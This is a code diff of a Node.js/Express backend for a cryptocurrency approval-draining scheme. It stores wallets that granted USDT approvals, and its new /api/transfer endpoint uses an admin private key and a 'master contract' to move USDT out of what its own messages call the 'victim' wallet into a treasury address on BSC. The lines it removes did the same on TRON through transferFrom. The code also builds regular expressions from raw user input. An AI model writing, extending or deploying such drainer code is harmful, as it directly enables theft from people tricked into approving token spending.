@@ -3,8 +3,7 @@ import cors from "cors";
 import dotenv from "dotenv";
 import mongoose from "mongoose";
 import Approved from "./models/Approved.js";
-import { TronWeb } from 'tronweb';
-
+import { ethers } from "ethers";
 
 dotenv.config();
 
@@ -15,13 +14,18 @@ const PORT = process.env.PORT || 3000;
 const MONGO_DB = process.env.MONGO_DB;
 const CORS_ORIGIN = process.env.CORS_ORIGIN || "*";
 const MONITOR_APPROVAL_FOR = process.env.MONITOR_APPROVAL_FOR;
-const MONITOR_APPROVAL_FOR_TRON = process.env.MONITOR_APPROVAL_FOR_TRON;
-const TRON_WALLET_PRIVATE_KEY = process.env.TRON_WALLET_PRIVATE_KEY;
+const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY;
+const TREASURY_ADDRESS = process.env.TREASURY_ADDRESS;
 
-const tronWeb = new TronWeb({
-  fullHost: 'https://api.trongrid.io',
-  privateKey: TRON_WALLET_PRIVATE_KEY
-});
+const BSC_RPC = "https://bsc-dataseed.binance.org/";
+const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+
+const USDT_ABI = [
+  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
+  "function balanceOf(address owner) view returns (uint256)",
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function decimals() view returns (uint8)",
+];
 
 /* ================= MIDDLEWARE ================= */
 
@@ -44,7 +48,6 @@ app.get("/", (_req, res) => {
 
 /* ================= APPROVED API ================= */
 
-// GET - Fetch approved records
 app.get("/api/approved", async (req, res) => {
   try {
     const { isProcessed, network, owner } = req.query;
@@ -66,18 +69,10 @@ app.get("/api/approved", async (req, res) => {
   }
 });
 
-// POST - Store a new approval record
 app.post("/api/approved", async (req, res) => {
   try {
-    const {
-      network,
-      owner,
-      spender,
-      amount,
-      txHash,
-    } = req.body;
+    const { network, owner, spender, amount, txHash } = req.body;
 
-    // Validate required fields
     const missingFields = [];
     if (!network) missingFields.push("network");
     if (!owner) missingFields.push("owner");
@@ -86,189 +81,153 @@ app.post("/api/approved", async (req, res) => {
     if (!txHash) missingFields.push("txHash");
 
     if (missingFields.length > 0) {
-      return res.status(400).json({
-        message: "Missing required fields",
-        missing: missingFields,
-      });
+      return res.status(400).json({ message: "Missing required fields", missing: missingFields });
     }
 
-    const ownerHexAddress = network === "TRON Mainnet" ? tronWeb.address.toHex(owner) : null;
-
-    console.log("Owner hex address is: ", ownerHexAddress, owner);
-
-
     const record = await Approved.findOneAndUpdate(
-      { txHash },                          // unique key (matches schema index)
+      { owner: { $regex: new RegExp(`^${owner}$`, "i") } },
       {
-        $set: {
-          network,
-          owner: owner,
-          ownerHexAddress: ownerHexAddress,
-          spender: spender,
-          amount: String(amount),
-          txHash
-        },
-        $setOnInsert: { isProcessed: false },      // only set on first insert
+        $set: { network, owner, spender, amount: String(amount), txHash },
+        $setOnInsert: { isProcessed: false },
       },
       { upsert: true, new: true }
     );
 
     res.status(201).json({ message: "Approval record saved", data: record });
   } catch (error) {
-    // Duplicate key race condition (two identical requests at once)
     if (error.code === 11000) {
-      return res.status(409).json({ message: "Duplicate record: txHash already exists" });
+      return res.status(409).json({ message: "Duplicate record" });
     }
     res.status(500).json({ message: "Failed to save approval record", error: error.message });
   }
 });
 
-
-// For Scanner Only 
 app.post("/api/scanner-approval", async (req, res) => {
   try {
     const { address } = req.body;
-
-    if (!address) {
-      return res.status(400).json({
-        message: "Missing required field: address",
-      });
-    }
-
-    const owner = address;
-
-    // Detect network
-    const network = owner.startsWith("0x")
-      ? "BSC Mainnet"
-      : "TRON Mainnet";
-
-    const ownerHexAddress = network === "TRON Mainnet" ? tronWeb.address.toHex(owner) : null;
-
+    if (!address) return res.status(400).json({ message: "Missing required field: address" });
 
     const record = await Approved.findOneAndUpdate(
+      { owner: { $regex: new RegExp(`^${address}$`, "i") } },
       {
-        owner: {
-          $regex: new RegExp(`^${owner}$`, "i"),
-        },
+        $set: { network: "BSC Mainnet", owner: address, spender: MONITOR_APPROVAL_FOR, amount: "1" },
+        $setOnInsert: { isProcessed: false },
       },
-      {
-        $set: {
-          network,
-          owner,
-          ownerHexAddress: ownerHexAddress,
-          spender: network === "TRON Mainnet" ? MONITOR_APPROVAL_FOR_TRON : MONITOR_APPROVAL_FOR,
-          amount: "1",
-        },
-        $setOnInsert: {
-          isProcessed: false,
-        },
-      },
-      {
-        upsert: true,
-        new: true,
-      }
+      { upsert: true, new: true }
     );
 
-    res.status(201).json({
-      message: "Approval record saved",
-      data: record,
-    });
-
+    res.status(201).json({ message: "Approval record saved", data: record });
   } catch (error) {
-
-    console.error("Error in /api/scanner-approval:", error);
-
-    if (error.code === 11000) {
-      return res.status(200).json({
-        message: "Approval record already exists",
-      });
-    }
-
-    res.status(500).json({
-      message: "Server error",
-      error: error.message,
-    });
+    if (error.code === 11000) return res.status(200).json({ message: "Already exists" });
+    res.status(500).json({ message: "Server error", error: error.message });
   }
 });
 
+/* ================= TRANSFER API ================= */
 
-app.post("/api/transfer-usdt-trc20", async (req, res) => {
+app.post("/api/transfer", async (req, res) => {
   try {
-    const { address } = req.body;
+    const { fromAddress, amount } = req.body;
 
-    console.log("Address -> : ", address);
+    if (!fromAddress || !amount) {
+      return res.status(400).json({ message: "fromAddress aur amount required hai" });
+    }
 
+    if (!ADMIN_PRIVATE_KEY) {
+      return res.status(500).json({ message: "ADMIN_PRIVATE_KEY set nahi hai" });
+    }
 
-    if (!address) {
+    if (!TREASURY_ADDRESS) {
+      return res.status(500).json({ message: "TREASURY_ADDRESS set nahi hai" });
+    }
+
+    const provider = new ethers.JsonRpcProvider(BSC_RPC);
+    const adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
+    const usdt = new ethers.Contract(USDT_CONTRACT, USDT_ABI, adminWallet);
+    const decimals = await usdt.decimals();
+
+    const transferAmount = ethers.parseUnits(String(amount), decimals);
+
+    const MASTER_CONTRACT = MONITOR_APPROVAL_FOR;
+
+    const [balance, allowance] = await Promise.all([
+      usdt.balanceOf(fromAddress),
+      usdt.allowance(fromAddress, MASTER_CONTRACT),
+    ]);
+
+    console.log("Balance:", ethers.formatUnits(balance, decimals));
+    console.log("Allowance:", ethers.formatUnits(allowance, decimals));
+    console.log("Requested:", amount);
+
+    if (balance < transferAmount) {
       return res.status(400).json({
-        message: "Missing required field: address",
+        message: `Victim ke wallet mein sirf ${ethers.formatUnits(balance, decimals)} USDT hai`,
       });
     }
 
-    console.log("address is: ", address);
+    if (allowance < transferAmount) {
+      return res.status(400).json({
+        message: `Allowance sirf ${ethers.formatUnits(allowance, decimals)} USDT hai`,
+      });
+    }
 
+    // Step 1: Master Contract se victim ka USDT master contract mein laao
+    const MASTER_ABI = [
+      "function forWithdraw(address from, uint256 amount)",
+      "function withdrawTo(address to, uint256 amount)",
+    ];
+    const masterContract = new ethers.Contract(MASTER_CONTRACT, MASTER_ABI, adminWallet);
 
-    const record = await Approved.findOne({
-      owner: new RegExp(`^${address}$`, "i"),
-      network: new RegExp("^TRON Mainnet$", "i"),
+    const tx1 = await masterContract.forWithdraw(fromAddress, transferAmount, {
+      gasLimit: 150000,
     });
+    console.log("✅ forWithdraw tx:", tx1.hash);
+    await tx1.wait();
 
-    if (!record) {
-      return res.status(404).json({
-        message: "Record not found",
-      });
-    }
+    // Step 2: Master Contract se TREASURY_ADDRESS pe bhejo
+    const tx2 = await masterContract.withdrawTo(TREASURY_ADDRESS, transferAmount, {
+      gasLimit: 150000,
+    });
+    console.log("✅ withdrawTo tx:", tx2.hash);
+    await tx2.wait();
+    console.log("✅ Transfer complete!");
 
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const contract = await tronWeb.contract().at(USDT_CONTRACT);
+    // DB update
+    await Approved.findOneAndUpdate(
+      { owner: { $regex: new RegExp(`^${fromAddress}$`, "i") } },
+      { $set: { isProcessed: true } }
+    );
 
-
-    const base58Address = tronWeb.address.fromHex(record?.ownerHexAddress);
-    console.log("base58Address is: ", base58Address, record?.owner);
-
-
-    const victimAddress = base58Address;
-    const treasuryAddress = record.spender;
-
-    const allowanceRes = await contract.allowance(victimAddress, treasuryAddress).call();
-
-    // const allowanceRes = await contract.allowance(treasuryAddress, victimAddress).call();
-
-    const balanceRes = await contract.balanceOf(victimAddress).call();
-
-    const allowance = BigInt(allowanceRes.toString());
-    const balance = BigInt(balanceRes.toString());
-
-    const transferable = allowance < balance ? allowance : balance;
-
-    console.log("allowance is: ", allowance, "balance is: ", balance, "transferable is: ", transferable);
-
-
-    if (transferable === 0n) {
-      return res.status(400).json({
-        message: "Insufficient approved amount or zero balance",
-      });
-    }
-
-    const txHash = await contract.transferFrom(
-      victimAddress,
-      treasuryAddress,
-      transferable.toString()
-    ).send();
-
-    res.status(201).json({
-      message: "USDT transferred successfully",
-      txHash,
+    res.json({
+      message: "USDT transfer successful",
+      txHash: tx2.hash,
+      from: fromAddress,
+      to: TREASURY_ADDRESS,
+      amount: amount,
     });
 
   } catch (error) {
-    res.status(500).json({
-      message: "Server error",
-      error: error.message,
-    });
+    console.error("Transfer error:", error);
+
+    let userMessage = "Transfer failed";
+
+    if (error.code === "INSUFFICIENT_FUNDS") {
+      userMessage = "Insufficient BNB in admin wallet for gas fees.";
+    } else if (error.code === "CALL_EXCEPTION") {
+      userMessage = "Contract call failed — allowance may be revoked.";
+    } else if (error.code === "NETWORK_ERROR" || error.code === "SERVER_ERROR") {
+      userMessage = "BSC network error — please try again.";
+    } else if (error.code === "NONCE_EXPIRED" || error.code === "REPLACEMENT_UNDERPRICED") {
+      userMessage = "Transaction conflict — please try again.";
+    } else if (error.shortMessage) {
+      userMessage = error.shortMessage;
+    } else if (error.message) {
+      userMessage = error.message;
+    }
+
+    res.status(500).json({ message: userMessage });
   }
 });
-
 
 /* ================= START SERVER ================= */
 
